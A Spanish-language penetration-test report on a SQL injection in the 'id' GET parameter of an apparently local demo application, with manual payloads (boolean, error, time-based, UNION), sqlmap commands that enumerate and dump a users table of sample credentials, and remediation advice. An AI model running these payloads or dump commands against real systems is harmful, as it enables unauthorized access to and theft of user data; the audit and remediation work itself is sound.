# Informe de auditoria SQLi

- Objetivo: `http://web.dev.local:8083`
- Fecha de analisis: `2026-04-24T05:37:57Z`
- Tipo de prueba: deteccion y validacion de SQL injection en parametro GET
- Resultado: **Vulnerabilidad SQL injection confirmada y explotada**

## Resumen ejecutivo

La aplicacion expone un formulario `GET` con el parametro `id` en la raiz (`/`). Ese parametro se concatena inseguramente en una consulta SQL contra MariaDB/MySQL. La vulnerabilidad permite al atacante alterar la logica de la consulta, provocar errores SQL, enumerar metadatos de la base de datos y extraer informacion sensible.

## Vector vulnerable

- URL: `http://web.dev.local:8083/?id=1&Submit=Submit`
- Parametro vulnerable: `id`
- Metodo: `GET`

## Evidencia manual

### 1. Error SQL visible

Payload probado:

```text
http://web.dev.local:8083/?id=1%27&Submit=Submit
```

Respuesta observada:

```text
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1 in /var/www/html/low.php:11
```

Esto confirma concatenacion directa del valor en la consulta y ademas una fuga de errores internos (`low.php`, linea 11, `mysqli_query`).

### 2. Inyeccion booleana

Payload verdadero:

```text
id=1' OR '1'='1' -- -
```

Payload falso:

```text
id=1' AND '1'='2' -- -
```

Comportamiento observado:

- Respuesta con condicion verdadera: longitud aproximada `3093` bytes
- Respuesta con condicion falsa: longitud aproximada `2484` bytes
- La diferencia de contenido/tamano indica manipulacion exitosa de la clausula `WHERE`

## Evidencia con sqlmap

Comando ejecutado:

```bash
sqlmap -u 'http://web.dev.local:8083/?id=1&Submit=Submit' -p id --batch --banner --current-db --level=3 --risk=2 --flush-session
```

Hallazgos principales:

- DBMS identificado: `MySQL >= 5.1 (MariaDB fork)`
- Banner: `10.11.14-MariaDB-ubu2204`
- Base de datos actual: `sqli_demo`
- Tecnicas confirmadas:
  - Boolean-based blind
  - Error-based (`EXTRACTVALUE`)
  - Time-based blind (`SLEEP`)
  - UNION-based

Payloads reportados por `sqlmap`:

```text
Boolean-based:
id=1' AND 3890=(SELECT (CASE WHEN (3890=3890) THEN 3890 ELSE (SELECT 1901 UNION SELECT 7220) END))-- -&Submit=Submit

Error-based:
id=1' AND EXTRACTVALUE(1778,CONCAT(0x5c,0x71716a7a71,(SELECT (ELT(1778=1778,1))),0x716a716271))-- xukx&Submit=Submit

Time-based:
id=1' AND (SELECT 3237 FROM (SELECT(SLEEP(5)))WcuX)-- gpUS&Submit=Submit

UNION-based:
id=1' UNION ALL SELECT NULL,CONCAT(0x71716a7a71,0x577350655755615a517059515678447268654641476c6c754c6547484b4e5a415a45764976416676,0x716a716271)-- -&Submit=Submit
```

## Explotacion realizada

### Enumeracion de tablas

Comando:

```bash
sqlmap -u 'http://web.dev.local:8083/?id=1&Submit=Submit' -p id --batch -D sqli_demo --tables
```

Resultado:

```text
Database: sqli_demo
[1 table]
+-------+
| users |
+-------+
```

### Extraccion de datos

Comando:

```bash
sqlmap -u 'http://web.dev.local:8083/?id=1&Submit=Submit' -p id --batch -D sqli_demo --dump --threads=4
```

Datos extraidos:

```text
Table: users
[8 entries]
+---------+---------------------+-------------+-----------+-----------+------------+
| user_id | email               | password    | username  | last_name | first_name |
+---------+---------------------+-------------+-----------+-----------+------------+
| 1       | admin@example.com   | password123 | admin     | Doe       | John       |
| 2       | jane@example.com    | secret456   | jsmith    | Smith     | Jane       |
| 3       | bob@example.com     | mypass789   | bjohnson  | Johnson   | Bob        |
| 4       | alice@example.com   | qwerty123   | awilliams | Williams  | Alice      |
| 5       | charlie@example.com | password    | cbrown    | Brown     | Charlie    |
| 6       | diana@example.com   | secure123   | ddavis    | Davis     | Diana      |
| 7       | eve@example.com     | hackme      | emiller   | Miller    | Eve        |
| 8       | frank@example.com   | admin123    | fwilson   | Wilson    | Frank      |
+---------+---------------------+-------------+-----------+-----------+------------+
```

La vulnerabilidad es por tanto **explotable** y permite acceso no autorizado a datos sensibles.

## Impacto

- Extraccion completa de datos de usuarios
- Enumeracion de estructura de base de datos
- Posible pivot a otras tablas/credenciales si existieran
- Exposicion de mensajes de error internos y rutas del servidor
- Riesgo alto si las credenciales se reutilizan en otros sistemas

## Causa raiz

El parametro `id` se utiliza sin consultas preparadas ni validacion estricta del tipo de dato. El mensaje de error sugiere una consulta del estilo:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```

## Recomendaciones

1. Sustituir concatenacion SQL por sentencias preparadas con parametros.
2. Validar `id` estrictamente como entero antes de consultar.
3. Desactivar mensajes de error detallados en produccion.
4. Aplicar principio de minimo privilegio al usuario de base de datos.
5. Revisar almacenamiento de contrasenas: las evidencias muestran valores en texto plano o muy debiles; deben almacenarse con hash robusto (`password_hash`/Argon2 o bcrypt).
6. Agregar logging y alertas para payloads anomalos y errores SQL.

## Conclusion

Se confirma una vulnerabilidad de **SQL injection** en el parametro GET `id` de `http://web.dev.local:8083/`. La vulnerabilidad fue validada manualmente y explotada con `sqlmap`, logrando identificar la base `sqli_demo`, enumerar la tabla `users` y extraer 8 registros con emails, nombres de usuario y contrasenas.
